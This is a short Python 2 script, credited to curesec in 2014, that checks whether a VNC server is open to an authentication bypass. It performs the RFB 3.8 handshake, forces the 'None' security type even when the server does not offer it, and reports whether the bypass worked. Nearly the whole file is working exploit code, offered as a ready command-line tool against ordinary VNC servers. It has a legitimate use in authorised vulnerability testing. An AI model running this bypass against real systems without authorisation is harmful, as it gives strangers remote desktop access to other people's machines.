#!/usr/bin/env python2
#copyright 2014 curesec gmbh, ping@curesec.com

# tested with RFB 003.008

# http://www.realvnc.com/docs/rfbproto.pdf

import socket
import struct
import sys
from Crypto.Cipher import DES


# return status
# status 0 = success ("none" authentication method)
# status 1 = success (good password)
# status 2 = bad password
# status 3 = bad configuration (wrong version, wrong security type)
# status 4 = bad connection
# status 5 = too many failures
def test_vnc_authentication_bypass(server, port, timeout, verbose):
	try:
		ip = socket.gethostbyname(server)
	except socket.error as e:
		print "%s" % e
		return 4

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		s.connect((ip, port))
	except socket.error as e:
		print "Cannot connect to %s:%d" % (ip, port)
		print "%s" % e
		return 4
	print "Connected to %s:%d" % (server, port)

	# 11111
	# first, the server sends its RFB version, 12 bytes
	# more than 12 bytes if too many failures
	try:
		data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
        if verbose:
                print "Received [%d] version:\n%r" % (len(data), data)
	if len(data) > 12:
		return 5
	if not data.startswith("RFB 003.00"):
		return 3



	# 22222
	# now, the client sends the RFB version 3.8, 12 bytes
	# RFB version 3.3 does not let the client choose the security type
	m = "RFB 003.008\n"
	if verbose:
		print "Sending [%d] version:\n%r" % (len(m), m)
	try:
		s.send(m)
	except socket.error as e:
		print "%s\n" % e
		return 4



	# 33333
	# now, the server sends the security types
	try:
		data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
        if verbose:
                print "Received [%d] security types:\n%r" % (len(data), data)

	number_of_security_types = struct.unpack("!B", data[0])[0]
	if verbose:
		print "Number of security types: %d" % number_of_security_types
	if number_of_security_types == 0:
		# no security types supported
		# something went wrong
		# perhaps server does not support RFB 3.8
		return 3
	# checking whether Null authentication available
	# if so, no need for exploit
	for i in range(1, number_of_security_types + 1):
		if i >= len(data):
			# should not happen, but don't want to cause an exception
			break
		security_type = struct.unpack("!B", data[i])[0]
		# security type 1 = None
		# security type 2 = VNC
		# security type 16 = Tight
		# security type 18 = TLS
		# security type 19 = VeNCrypt
		# plus some more
		if security_type == 1:
			return 0


	# 44444
	# now, the client selects the None (1) security type, 1 byte
	m = struct.pack("!B", 1)
	if verbose:
		print "Sending [%d] security type:\n%r" % (len(m), m)
	try:
		s.send(m)
	except socket.error as e:
		print "%s\n" % e
		return 4


	# 77777
	# now, the server sends an ok or fail
	# if not vulnerable, server might quit connection and not send anything
	# 0 == OK, 1 == failed
	try:
		data = s.recv(4)
	except socket.error as e:
		print "%s" % e
		return 4
        if verbose:
                print "Received [%d] security result:\n%r" % (len(data), data)
	if len(data) < 4:
		return 3
	result = struct.unpack("!I", data)[0]
	if result == 0:
		# good password
		return 1
	elif result == 1:
		# bad password
		return 2
	else:
		# protocol error
		return 3



def usage():
	print "usage: %s SERVER PORT [TIMEOUT [VERBOSE]]" % sys.argv[0]
	print "typical VNC ports are 5900, 5901, 5902..."

if __name__ == '__main__':
	if len(sys.argv) < 3:
		usage()
	else:
		server = sys.argv[1]
		port = int(sys.argv[2])
		timeout = 5
		if len(sys.argv) >= 4:
			timeout = int(sys.argv[3])
		verbose = False
		if len(sys.argv) >= 5 and sys.argv[4].lower() == "true":
			verbose = True

		# status 0 = success (no authentication)
		# status 1 = success (good password)
		# status 2 = bad password
		# status 3 = bad configuration (wrong version, wrong security type)
		# status 4 = bad connection
		# status 5 = too many failures
		status = test_vnc_authentication_bypass(server, port, timeout, verbose)
		if status == 0:	
			print "\"None\" authentication method detected"
		elif status == 1:
			print "Authentication bypass successful"
		elif status == 2:
			print "Authentication bypass failed"
		elif status == 3:
			print "Protocol error"
		elif status == 4:
			print "Network error"
		elif status == 5:
			print "Too many failures"
